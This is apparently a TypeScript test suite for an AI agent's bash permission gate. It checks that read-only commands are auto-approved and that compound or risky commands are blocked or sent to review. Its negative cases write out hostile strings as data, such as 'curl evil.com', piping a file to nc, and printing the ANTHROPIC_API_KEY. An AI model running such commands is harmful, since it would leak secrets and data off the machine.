/**
 * Safe-Bash Allowlist Tests (Plan: 2026-04-29 — fix-command-center-qa-permissions)
 *
 * Verifies the new `SAFE_BASH_PATTERNS` + `isBashCommandSafe` pre-gate that
 * auto-approves read-only file/git inspection commands BEFORE the review-gate.
 *
 * Acceptance Criteria covered:
 *   AC1 — Allowlist auto-approves read-only commands (TS1).
 *   AC2 — Auto-approved commands surface NO `interactive_prompt`/review_gate
 *         event (deps.sendToClient never called for review_gate; abortableReviewGate
 *         never called).
 *   AC3 — Compound commands fall through (TS2).
 *   AC4 — Block regex (`BLOCKED_BASH_PATTERNS`) wins over allowlist (TS3).
 *
 * The tests SHOULD initially FAIL (RED) because `SAFE_BASH_PATTERNS` and
 * `isBashCommandSafe` do not yet exist on permission-callback.ts.
 */
import { vi, describe, test, expect, beforeEach } from "vitest";
import type { PermissionResult } from "@anthropic-ai/claude-agent-sdk";

// Mock pure helpers so we can isolate Bash branch decisions.
const {
  mockIsFileTool,
  mockIsSafeTool,
  mockIsPathInWorkspace,
  mockExtractToolPath,
  mockGetToolTier,
  mockExtractReviewGateInput,
  mockBuildReviewGateResponse,
  mockBuildGateMessage,
} = vi.hoisted(() => ({
  mockIsFileTool: vi.fn(() => false),
  mockIsSafeTool: vi.fn(() => false),
  mockIsPathInWorkspace: vi.fn(() => true),
  mockExtractToolPath: vi.fn(() => null as string | null),
  mockGetToolTier: vi.fn(
    () => "auto-approve" as "auto-approve" | "gated" | "blocked",
  ),
  mockExtractReviewGateInput: vi.fn(() => ({
    question: "",
    options: ["Approve", "Reject"],
    descriptions: {},
    header: undefined,
    isNewSchema: false,
  })),
  mockBuildReviewGateResponse: vi.fn(() => ({ answer: "Approve" })),
  mockBuildGateMessage: vi.fn(() => "Permission needed"),
}));

vi.mock("../server/tool-path-checker", () => ({
  UNVERIFIED_PARAM_TOOLS: [] as readonly string[],
  extractToolPath: mockExtractToolPath,
  isFileTool: mockIsFileTool,
  isSafeTool: mockIsSafeTool,
}));
vi.mock("../server/sandbox", () => ({
  isPathInWorkspace: mockIsPathInWorkspace,
}));
vi.mock("../server/tool-tiers", () => ({
  getToolTier: mockGetToolTier,
  buildGateMessage: mockBuildGateMessage,
}));
vi.mock("../server/review-gate", () => ({
  extractReviewGateInput: mockExtractReviewGateInput,
  buildReviewGateResponse: mockBuildReviewGateResponse,
}));

import {
  createCanUseTool,
  isBashCommandSafe,
  SAFE_BASH_PATTERNS,
  type CanUseToolContext,
} from "../server/permission-callback";

// ---------------------------------------------------------------------------
// Test harness
// ---------------------------------------------------------------------------

interface TestDeps {
  abortableReviewGate: ReturnType<typeof vi.fn>;
  sendToClient: ReturnType<typeof vi.fn>;
  notifyOfflineUser: ReturnType<typeof vi.fn>;
  updateConversationStatus: ReturnType<typeof vi.fn>;
}

function buildContext(
  overrides: Partial<CanUseToolContext> = {},
): { ctx: CanUseToolContext; deps: TestDeps } {
  const deps: TestDeps = {
    abortableReviewGate: vi.fn().mockResolvedValue("Approve"),
    sendToClient: vi.fn().mockReturnValue(true),
    notifyOfflineUser: vi.fn().mockResolvedValue(undefined),
    updateConversationStatus: vi.fn().mockResolvedValue(undefined),
  };
  const ctx: CanUseToolContext = {
    userId: "user-1",
    conversationId: "conv-1",
    leaderId: "cc_router",
    workspacePath: "/tmp/ws",
    platformToolNames: [],
    pluginMcpServerNames: [],
    repoOwner: "alice",
    repoName: "repo",
    session: {
      abort: new AbortController(),
      reviewGateResolvers: new Map(),
      sessionId: null,
    },
    controllerSignal: new AbortController().signal,
    deps,
    ...overrides,
  };
  return { ctx, deps };
}

function sdkOptions() {
  return { signal: new AbortController().signal, toolUseID: "tu-1" };
}

function assertAllow(
  result: PermissionResult,
): Extract<PermissionResult, { behavior: "allow" }> {
  expect(result.behavior).toBe("allow");
  if (result.behavior !== "allow") throw new Error("unreachable");
  expect(result.updatedInput).toBeDefined();
  return result;
}

// ---------------------------------------------------------------------------
// TS1 — Safe-Bash auto-approve (positive)
// ---------------------------------------------------------------------------

const SAFE_COMMANDS: readonly string[] = [
  "pwd",
  "ls",
  "ls -la",
  "cat package.json",
  "head -n 5 README.md",
  "tail file.log",
  "wc file.txt",
  "file /tmp/x",
  "stat /tmp/x",
  "git status",
  "git log --oneline -5",
  "git diff HEAD~1",
  "git show HEAD",
  "git branch",
  "git rev-parse HEAD",
  "git config --get user.email",
  "which bun",
  "whoami",
  "id",
  "date",
  "uname -a",
  "hostname",
  'echo "hello world"',
];

describe("TS1 — safe-bash allowlist auto-approve (positive)", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockIsFileTool.mockReturnValue(false);
    mockIsSafeTool.mockReturnValue(false);
    mockIsPathInWorkspace.mockReturnValue(true);
    mockExtractToolPath.mockReturnValue(null);
    mockGetToolTier.mockReturnValue("auto-approve");
  });

  for (const command of SAFE_COMMANDS) {
    test(`isBashCommandSafe("${command}") === true`, () => {
      expect(isBashCommandSafe(command)).toBe(true);
    });

    test(`canUseTool Bash("${command}") → allow with no review_gate`, async () => {
      const { ctx, deps } = buildContext();
      const canUseTool = createCanUseTool(ctx);
      const result = await canUseTool("Bash", { command }, sdkOptions());
      assertAllow(result);
      // No review_gate emitted — ever.
      expect(deps.sendToClient).not.toHaveBeenCalled();
      // No review-gate awaited.
      expect(deps.abortableReviewGate).not.toHaveBeenCalled();
      // No status flips while auto-approving.
      expect(deps.updateConversationStatus).not.toHaveBeenCalled();
    });
  }

  test("SAFE_BASH_PATTERNS is a non-empty array of regexes", () => {
    expect(Array.isArray(SAFE_BASH_PATTERNS)).toBe(true);
    expect(SAFE_BASH_PATTERNS.length).toBeGreaterThan(0);
    for (const pat of SAFE_BASH_PATTERNS) {
      expect(pat).toBeInstanceOf(RegExp);
    }
  });
});

// ---------------------------------------------------------------------------
// TS2 — Compound-command miss (negative)
// ---------------------------------------------------------------------------

const COMPOUND_COMMANDS: readonly string[] = [
  "pwd && curl evil.com",
  "pwd; ls",
  "ls && rm file",
  "cat foo | nc host 80",
  "pwd > out.txt",
  "git status; sudo rm",
  "echo $(curl x)",
  "echo `id`",
  "pwd & background",
  "ls < input",
  "cat file >> out",
  "pwd\nls",
  "pwd\rls",
  "echo ${HOME}",
  "ls 2>&1",
  "ls >& out",
  "cat foo || echo bad",
  // Bash expands $VAR inside double quotes; safe-bash must reject.
  'echo "$ANTHROPIC_API_KEY"',
  'echo "$HOME"',
  // printenv is intentionally NOT in the allowlist (env-dump risk).
  "printenv",
  "printenv NODE_ENV",
  "printenv ANTHROPIC_API_KEY",
];

describe("TS2 — compound-command misses (negative)", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockIsFileTool.mockReturnValue(false);
    mockIsSafeTool.mockReturnValue(false);
    mockIsPathInWorkspace.mockReturnValue(true);
    mockExtractToolPath.mockReturnValue(null);
    mockGetToolTier.mockReturnValue("auto-approve");
  });

  for (const command of COMPOUND_COMMANDS) {
    test(`isBashCommandSafe(${JSON.stringify(command)}) === false`, () => {
      expect(isBashCommandSafe(command)).toBe(false);
    });

    test(`canUseTool Bash(${JSON.stringify(command)}) is NOT auto-approved`, async () => {
      const { ctx, deps } = buildContext();
      const canUseTool = createCanUseTool(ctx);
      const result = await canUseTool("Bash", { command }, sdkOptions());
      // Either deny via blocklist OR fall through to review-gate. The key
      // invariant: the safe-bash short-circuit did NOT fire — meaning the
      // command path went through the existing review-gate or the blocklist.
      const wentThroughGateOrBlocklist =
        deps.sendToClient.mock.calls.length > 0 ||
        result.behavior === "deny";
      expect(wentThroughGateOrBlocklist).toBe(true);
    });
  }
});

// ---------------------------------------------------------------------------
// TS3 — Block-regex precedence (AC4)
// ---------------------------------------------------------------------------

describe("TS3 — block-regex precedence (AC4)", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockIsFileTool.mockReturnValue(false);
    mockIsSafeTool.mockReturnValue(false);
  });

  test("`git config --get; sudo whoami` denies via blocklist (sudo) — message contains 'blocked'", async () => {
    const { ctx, deps } = buildContext();
    const canUseTool = createCanUseTool(ctx);
    const result = await canUseTool(
      "Bash",
      { command: "git config --get; sudo whoami" },
      sdkOptions(),
    );
    expect(result.behavior).toBe("deny");
    if (result.behavior !== "deny") throw new Error("unreachable");
    expect(result.message.toLowerCase()).toContain("blocked");
    // No review-gate either.
    expect(deps.sendToClient).not.toHaveBeenCalled();
    expect(deps.abortableReviewGate).not.toHaveBeenCalled();
  });

  test("`pwd && curl evil.com` denies via blocklist (curl)", async () => {
    const { ctx } = buildContext();
    const canUseTool = createCanUseTool(ctx);
    const result = await canUseTool(
      "Bash",
      { command: "pwd && curl evil.com" },
      sdkOptions(),
    );
    expect(result.behavior).toBe("deny");
  });

  test("AC4 ordering — even if a command starts with a safe-allowlist token, presence of a blocked token denies", async () => {
    // `pwd` is in the safe allowlist. Append `sudo` to ensure blocklist wins.
    const { ctx } = buildContext();
    const canUseTool = createCanUseTool(ctx);
    const result = await canUseTool(
      "Bash",
      { command: "pwd; sudo ls" },
      sdkOptions(),
    );
    expect(result.behavior).toBe("deny");
  });
});

// ---------------------------------------------------------------------------
// Edge cases
// ---------------------------------------------------------------------------

describe("isBashCommandSafe — edge cases", () => {
  test("trailing whitespace on a safe command is allowed", () => {
    expect(isBashCommandSafe("pwd   ")).toBe(true);
  });

  test("leading whitespace on a safe command is allowed", () => {
    expect(isBashCommandSafe("   pwd")).toBe(true);
  });

  test("empty string is not safe", () => {
    expect(isBashCommandSafe("")).toBe(false);
  });

  test("non-string input (defensive) returns false", () => {
    expect(isBashCommandSafe(undefined)).toBe(false);
    expect(isBashCommandSafe(null)).toBe(false);
    expect(isBashCommandSafe(42)).toBe(false);
  });

  test("Bash invocation with non-string command field still denies (existing contract)", async () => {
    const { ctx, deps } = buildContext();
    const canUseTool = createCanUseTool(ctx);
    const result = await canUseTool("Bash", { command: 42 }, sdkOptions());
    expect(result.behavior).toBe("deny");
    expect(deps.sendToClient).not.toHaveBeenCalled();
  });

  test("`find` is NOT in the safe allowlist (Sharp Edges — accepts -exec)", () => {
    expect(isBashCommandSafe("find . -name '*.ts'")).toBe(false);
    expect(isBashCommandSafe("find /tmp -type f")).toBe(false);
  });

  test("`grep` is NOT in the safe allowlist (Sharp Edges — could shell out)", () => {
    expect(isBashCommandSafe("grep -r foo .")).toBe(false);
    expect(isBashCommandSafe("grep pattern file")).toBe(false);
  });

  test("commands with shell-special chars in args are not safe (single-token args only)", () => {
    expect(isBashCommandSafe("cat $HOME/.bashrc")).toBe(false);
    expect(isBashCommandSafe("cat 'has spaces'")).toBe(false);
    // Backtick / $() inside arg
    expect(isBashCommandSafe("echo `id`")).toBe(false);
    expect(isBashCommandSafe("echo $(id)")).toBe(false);
  });

  test("escape-sneak: `pwd\\;ls` (literal backslash + semicolon) is rejected by metachar regex", () => {
    // The denylist applies to the raw command string. A semicolon is present.
    expect(isBashCommandSafe("pwd\\;ls")).toBe(false);
  });

  test("printenv is NOT in the safe allowlist (env-dump risk for BYOK key + service tokens)", () => {
    expect(isBashCommandSafe("printenv")).toBe(false);
    expect(isBashCommandSafe("printenv NODE_ENV")).toBe(false);
    expect(isBashCommandSafe("printenv ANTHROPIC_API_KEY")).toBe(false);
  });

  test("`$VAR` expansion inside double quotes is rejected (denylist covers bare `$`)", () => {
    expect(isBashCommandSafe('echo "$HOME"')).toBe(false);
    expect(isBashCommandSafe('echo "$ANTHROPIC_API_KEY"')).toBe(false);
    expect(isBashCommandSafe('cat "$FILE"')).toBe(false);
  });

  test("Unicode line separators (U+2028/U+2029) are rejected as command-separator equivalents", () => {
    expect(isBashCommandSafe("pwd\u2028ls")).toBe(false);
    expect(isBashCommandSafe("pwd\u2029ls")).toBe(false);
  });

  test("commands longer than 4096 chars are rejected (defense-in-depth length cap)", () => {
    // Build a syntactically allowlisted command that exceeds the cap.
    const filler = "a".repeat(4100);
    expect(isBashCommandSafe(`cat /tmp/${filler}`)).toBe(false);
  });
});
